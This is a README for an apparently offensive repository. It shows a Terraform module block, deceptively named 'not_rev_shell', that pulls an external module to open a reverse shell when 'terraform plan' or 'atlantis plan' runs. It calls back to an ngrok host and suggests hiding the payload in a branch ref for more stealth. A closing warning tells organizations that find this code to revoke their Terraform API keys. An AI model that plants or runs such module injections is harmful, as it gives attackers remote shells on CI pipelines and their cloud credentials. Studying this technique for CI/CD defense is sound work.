# terraform_external_module_rev_shell

Terraform file external dependency injection to get rev shell when `terraform plan` or `atlantis plan` is run.

```bash
module "not_rev_shell" {
  source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```

For an even **more stealth attack** you can use the **ref** feature to hide the **terraform rev shell code in a branch** inside of the repo, something like:
```git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b```

More information in https://book.hacktricks.xyz/cloud-security/atlantis

IF YOU FOUND SOMETHING SIMILAR IN YOUR ORGANIZATION (this repo probably won't work out of the box as the rev shell is sent to 4.tcp.ngrok.io:15925), YOU HAVE BEEN COMPROMISED.
DEACTIVATE ALL THE API KEYS THAT TERRAFORM IS USING AND CHECK FOR FURTHER EXPLOITATIONS AND MOVEMENTS
